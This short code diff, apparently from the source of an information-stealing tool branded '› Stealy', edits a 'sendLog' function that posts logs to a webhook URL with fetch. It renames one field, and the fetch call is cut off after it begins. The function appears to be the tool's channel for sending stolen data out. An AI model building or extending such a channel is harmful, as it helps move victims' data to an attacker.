@@ -218,7 +218,7 @@ async function errorHandler(error)
 */
 async function sendLog(webhook_url, options = { name: '› Stealy', avatar_url: 'https://senju.cc/images/Speed.png' })
 {
-    options.name = '› Stealy'
+    options.username = '› Stealy'
     options.avatar_url = 'https://senju.cc/images/Speed.png';
     await fetch(webhook_url, 
     {
